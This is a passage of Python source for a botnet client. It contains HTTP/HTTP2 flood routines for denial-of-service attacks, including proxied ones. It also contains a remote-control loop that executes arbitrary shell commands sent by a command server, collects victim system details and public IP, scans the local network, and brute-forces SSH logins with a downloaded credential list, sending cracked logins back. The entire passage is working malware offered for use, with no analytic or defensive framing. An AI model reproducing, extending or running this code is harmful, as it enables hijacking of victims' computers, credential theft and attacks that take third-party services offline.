        req += "Connection: Keep-Alive\r\n\r\n"
        while time() < timelol:
            try:
                s = socks.socksocket()
                s.connect((str(urlparse(url).netloc), int(443)))
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
                s.send(str.encode(req))
                try:
                    for _ in range(100):
                        s.send(str.encode(req))
                        s.send(str.encode(req))
                except:
                    s.close()
            except:
                s.close()
    #endregion

    #region STELLAR
    def attackSTELLAR(self, url, timer, threads):
        for i in range(int(threads)):
            threading.Thread(target=self.LaunchSTELLAR, args=(url, timer)).start()

    def LaunchSTELLAR(self, url, timer):
        timelol = time() + int(timer)
        req =  "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
        req += "Cache-Control: no-cache\r\n"
        req += "User-Agent: " + random.choice(self.ua) + "\r\n"
        req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
        req += "Sec-Fetch-Site: same-origin\r\n"
        req += "Sec-GPC: 1\r\n"
        req += "Sec-Fetch-Mode: navigate\r\n"
        req += "Sec-Fetch-Dest: document\r\n"
        req += "Upgrade-Insecure-Requests: 1\r\n"
        req += "Connection: Keep-Alive\r\n\r\n"
        while time() < timelol:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(urlparse(url).netloc), int(443)))
                ctx = ssl.create_default_context()
                s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
                s.send(str.encode(req))
                try:
                    for _ in range(100):
                        s.send(str.encode(req))
                        s.send(str.encode(req))
                except:
                    s.close()
            except:
                s.close()
    #endregion

    #region HTTP2
    def LaunchHTTP2(self, url, th, t):
        until = datetime.now() + timedelta(seconds=int(t))
        for _ in range(int(th)):
            threading.Thread(target=self.AttackHTTP2, args=(url, until)).start()

    def AttackHTTP2(self, url, until_datetime):
        headers = {
                'User-Agent': random.choice(self.ua),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'TE': 'trailers',
                }
        client = httpx.Client(http2=True)
        while (until_datetime - datetime.now()).total_seconds() > 0:
            try:
                client.get(url, headers=headers)
                client.get(url, headers=headers)
            except:
                pass
    #endregion

    #region PXHTTP2
    def LaunchPXHTTP2(self, url, th, t):
        until = datetime.now() + timedelta(seconds=int(t))
        for _ in range(int(th)):
            threading.Thread(target=self.AttackHTTP2, args=(url, until)).start()

    def AttackPXHTTP2(self, url, until_datetime):
        headers = {
                'User-Agent': random.choice(self.ua),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'TE': 'trailers',
                }
        
        while (until_datetime - datetime.now()).total_seconds() > 0:
            try:
                client = httpx.Client(
                    http2=True,
                    proxies={
                        'http://': 'http://'+random.choice(self.proxy_list),
                        'https://': 'http://'+random.choice(self.proxy_list),
                    }
                )
                client.get(url, headers=headers)
                client.get(url, headers=headers)
            except:
                pass
    #endregion

    #region testzone
    def test1(self, url, th, t):
        until  = datetime.now() + timedelta(seconds=int(t))
        target = self.get_target(url)
        req =  'GET '+ target['uri'] +' HTTP/1.1\r\n'
        req += 'Host: ' + target['host'] + '\r\n'
        req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
        req += 'Accept-Encoding: gzip, deflate, br\r\n'
        req += 'Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
        req += 'Cache-Control: max-age=0\r\n'
        req += f'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'
        req += 'sec-ch-ua-mobile: ?0\r\n'
        req += 'sec-ch-ua-platform: "Windows"\r\n'
        req += 'sec-fetch-dest: empty\r\n'
        req += 'sec-fetch-mode: cors\r\n'
        req += 'sec-fetch-site: same-origin\r\n'
        req += 'Connection: Keep-Alive\r\n'
        req += 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en\r\n\r\n\r\n'
        for _ in range(int(th)):
            try:
                thd = threading.Thread(target=self.test2,args=(until, target, req,))
                thd.start()
            except:  
                pass

    def test2(self, until_datetime, target, req):
        if target['scheme'] == 'https':
            packet = socks.socksocket()
            packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            packet.connect((str(target['host']), int(target['port'])))
            packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
        else:
            packet = socks.socksocket()
            packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            packet.connect((str(target['host']), int(target['port'])))
        while (until_datetime - datetime.now()).total_seconds() > 0:
            try:
                for _ in range(10):
                    packet.send(str.encode(req))
            except:
                packet.close()
                pass
    #endregion

    #endregion

    fuck_regions = True


class Client():
    #region Client Functions
    def __init__(self, connect:Tuple[str,int]=(IP, PORT)) -> None:
        signal.signal(signal.SIGINT, self.exit_gracefully)
        signal.signal(signal.SIGTERM, self.exit_gracefully)

        self.bot_name   = str(os.getlogin()).lower()                    # Get bot name
        self.temp       = os.getenv('temp')                             # Get temp directory
        self.is_admin   = ctypes.windll.shell32.IsUserAnAdmin() != 0    # Check if user is admin
        self.public_ip  = self.getip()                                  # Get public IP address
        self.system     = platform.uname()                              # Get system info

        self.stop = False
        self.run  = False

        while not self.stop:
            try: self._connect(connect)
            except KeyboardInterrupt: continue
            except: sleep(1)

    def exit_gracefully(self, signum, frame):
        self.stop = True
        self.run = False
        self.sock.close()
        sleep(1)
        os._exit(1)

    def _connect(self, connect:Tuple[str,int]) -> None:
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect(connect)      # Connect to the server
        self.start()                    # Start client

    def _recv(self):
        rec = self.sock.recv(1024).decode("ascii")

        if rec[4:] == "root":
            return rec

        else: return rec.lower()
    #endregion

    def getip(self):
        ''' Get public IP address '''
        try:    ip = requests.get("https://api.ipify.org").text
        except: ip = "None"
        return  ip

    def _shell_run(self, commands):
        ''' Run shell commands '''
        subproces = subprocess.Popen(commands, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output    = subproces.stderr.read() + subproces.stdout.read()

        if len(output) == 0: 
            output = b"No Output"

        self.sock.send(output)

    def network_scan(self):
        ''' Scan network for open ports '''

        def scan(ip):
            arp_request = ARP(pdst = ip)
            broadcast   = Ether(dst = "ff:ff:ff:ff:ff:ff")
            broadcast_  = broadcast/arp_request
            answerred, _ = srp(broadcast_, timeout=1, verbose=0)
            
            clients = []
            for element in answerred:
                clients.append({"ip": element[1].psrc, "mac": element[1].hwsrc, })

            return clients

        def output_results(clients):
            out = "\n\n\t ------- Network Scan Results -------\n\n"
            for client in clients: out += f"\t{client['ip']} \t\t{client['mac']}\n"
            return out

        results = scan("192.168.0.1/24")
        output  = output_results(results)
        self.sock.send(str.encode(output))

    def network_attack(self):
        ''' Network attack '''
        connected = []
        usernames = []
        passwords = []
        total     = 0

        def load_combos():
            ''' Load combos '''
            global usernames, passwords, total
            list = requests.get("https://raw.githubusercontent.com/Callumgm/dump/main/Beans/80k%20combos").text
            for line in list.splitlines():
                try: 
                    username, password = line.split(":")
                    usernames.append(username)
                    passwords.append(password)
                    total += 1
                except: continue
            
        def connect(host:str, username:str, password:str):
            """
            Try and connect to host via SSH.
            If connection is successful, attempt to brute force login.
            Parameters
            ----------
            host : str
                Generated IP address to attempt to connect to.
            Returns
            -------
            None
            """
            global usernames, passwords, total, connected
            
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
            try:
                # connect to host with username and password
                client.connect(host, 22, username, password, timeout=5)

                # if we get here, we have cracked the bot
                connected.append(host + " | " + username + ":" + password)
                    
            except socket.error: 
                pass
            except paramiko.ssh_exception.AuthenticationException: 
                pass
            except paramiko.ssh_exception.SSHException: 
                pass

        load_combos()

        def scan(ip):
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast/arp_request
            answerred, _ = srp(arp_request_broadcast, timeout=1, verbose=0)
            
            clients = []
            for element in answerred:
                clients.append({
                    "ip": element[1].psrc,
                    "mac": element[1].hwsrc,
            })
            return clients

        def output_results(clients):
            c = []
            for client in clients: c.append(client['ip'])
            return c

        results = scan("192.168.0.1/24")
        for client in output_results(results):
            for i in range(total):
                connect(client, usernames[i], passwords[i])

        if connected != []:
            self.sock.send(str.encode(str(connected)))
        else: self.sock.send(str.encode("Unable to crack network"))

    def start(self):
        while True:
            data = self._recv()
            
            if "root" in data:
                try:
                    data = data.replace("root ","")
                    commands = str(data)

                    self._shell_run(commands)
                except Exception as e: self.sock.send(f"\n\nError:\n\n{e}\n\n========================================================================\n\n".encode("ascii"))

            elif "admincheck" in data:
                try: self.sock.send(str.encode("Admin privileges")) if self.is_admin == True else self.sock.send(str.encode("NO Admin privileges"))
                except Exception as e: self.sock.send(f"\n\nError:\n\n{e}\n\n========================================================================\n\n".encode("ascii"))

            elif "ddos" in data:
                try:
                    data = data.replace("ddos ","").split()
                    method   = str(data[0]).lower()
                    ip       = str(data[1])
                    port     = str(data[2])
                    thread   = str(data[3])
                    duration = str(data[4])

                    if method == "udp":
                        Attack.runsender(ip, port, thread, duration)
                    
                    elif method == "tcp":
                        Attack.runflooder(ip, port, thread, duration)
                    
                    else: self.sock.send(str.encode("Invalid method")) 
                
                except Exception as e: self.sock.send(f"\n\nError:\n\n{e}\n\n========================================================================\n\n".encode("ascii"))

            elif "attack" in data:
                try:
                    data = data.replace("attack ","").split()
                    method   = str(data[0]).lower()
                    ip       = str(data[1])
                    thread   = str(data[2])
                    duration = str(data[3])

                    a = Attack()

                    if method == "cfb":
                        a.LaunchCFB(ip, thread, duration)
                        self.sock.send(str.encode("Sent Attack"))
                    
                    elif method == "pxcfb":
                        if a.get_proxys():
                            a.LaunchPXCFB(ip, thread, duration)
                            self.sock.send(str.encode("Sent Attack"))
                        else: self.sock.send(str.encode("Failed to get proxies"))

                    elif method == "cfreq":
                        if a.get_cookie(ip):
                            a.LaunchCFPRO(ip, thread, duration)
                            self.sock.send(str.encode("Sent Attack"))
                        else: self.sock.send(str.encode("Failed to bypass CF protection"))

                    elif method == "pxsoc":
                        if a.get_proxys():
                            a.LaunchPXSOC(ip, thread, duration)
                            self.sock.send(str.encode("Sent Attack"))
                        else: self.sock.send(str.encode("Failed to get proxies"))
                    
                    elif method == "get":
                        a.LaunchRAW(ip, thread, duration)
                        self.sock.send(str.encode("Sent Attack"))

                    elif method == "post":
                        a.LaunchPOST(ip, thread, duration)
                        self.sock.send(str.encode("Sent Attack"))

                    elif method == "head":
                        a.LaunchHEAD(ip, thread, duration)
                        self.sock.send(str.encode("Sent Attack"))

                    elif method == "pxraw":
                        if a.get_proxys():
                            a.LaunchPXRAW(ip, thread, duration)
                            self.sock.send(str.encode("Sent Attack"))
                        else: self.sock.send(str.encode("Failed to get proxies"))

                    elif method == "soc":
                        a.LaunchSOC(ip, thread, duration)
                        self.sock.send(str.encode("Sent Attack"))

                    elif method == "pxsoc":
                        if a.get_proxys():
                            a.LaunchPXSOC(ip, thread, duration)
                            self.sock.send(str.encode("Sent Attack"))
                        else: self.sock.send(str.encode("Failed to get proxies"))

                    elif method == "cfsoc":
                        if a.get_cookie(ip):
                            a.LaunchCFSOC(ip, thread, duration)
                            self.sock.send(str.encode("Sent Attack"))
                        else: self.sock.send(str.encode("Failed to bypass CF protection"))

                    elif method == "http2":
                        a.LaunchHTTP2(ip, thread, duration)
                        self.sock.send(str.encode("Sent Attack"))

                    elif method == "pxhttp2":
                        if a.get_proxys(ip):
                            a.LaunchPXHTTP2(ip, thread, duration)
                            self.sock.send(str.encode("Sent Attack"))
                        else: self.sock.send(str.encode("Failed to bypass CF protection"))

                    elif method == "pxsky":
                        if a.get_proxys(ip):
                            a.attackSKY(ip, duration, thread)
                            self.sock.send(str.encode("Sent Attack"))
                        else: self.sock.send(str.encode("Failed to bypass CF protection"))

                    elif method == "sky":
                        a.attackSTELLAR(ip, duration, thread)
                        self.sock.send(str.encode("Sent Attack"))

                    else: self.sock.send(str.encode("Invalid method")) 
                
                except Exception as e: self.sock.send(f"\n\nError:\n\n{e}\n\n========================================================================\n\n".encode("ascii"))

            elif data == "kill":
                self.sock.send(str.encode("Client Killed"))
                self.sock.close()
                self.exit_gracefully(0,0)

            elif data == "getip":
                try: self.sock.send(str.encode(f"{self.public_ip}    \t{self.system.system}"))
                except Exception as e: self.sock.send(f"\n\nError:\n\n{e}\n\n========================================================================\n\n".encode("ascii"))

            elif data == "sysinfo":
                try: 
                    total, used, free = shutil.disk_usage("/")

                    data = f"""
    ------------------- Main Info -------------------
            Username:   \t{self.bot_name}
            Admin:      \t{self.is_admin}
            Public IP:  \t{self.public_ip}

    ------------------- Disk Info -------------------
            Total:      \t{total // (2**30)} GB
            Used:       \t{used // (2**30)} GB
            Free:       \t{free // (2**30)} GB

    ------------------- System Info -------------------
            System:     \t{self.system.system}
            Node Name:  \t{self.system.node}
            Release:    \t{self.system.release}
            Version:    \t{self.system.version}
            Machine:    \t{self.system.machine}
            Processor:  \t{self.system.processor}
                    """
                    self.sock.send(str.encode(data))
                except Exception as e: self.sock.send(f"\n\nError:\n\n{e}\n\n========================================================================\n\n".encode("ascii"))
 
            elif data == "networkscan":
                try: 
                    self.network_scan()
                except Exception as e: self.sock.send(f"\n\nError:\n\n{e}\n\n========================================================================\n\n".encode("ascii"))
 
            elif data == "networkattack":
                try: self.network_attack()
                except Exception as e: self.sock.send(f"\n\nError:\n\n{e}\n\n========================================================================\n\n".encode("ascii"))

            else: self.sock.send(str.encode("Invalid Command"))



if __name__ == "__main__":
    try: requests.get('https://google.com')
    except: os._exit(1)

    # AntiDebug().start()
    Client()
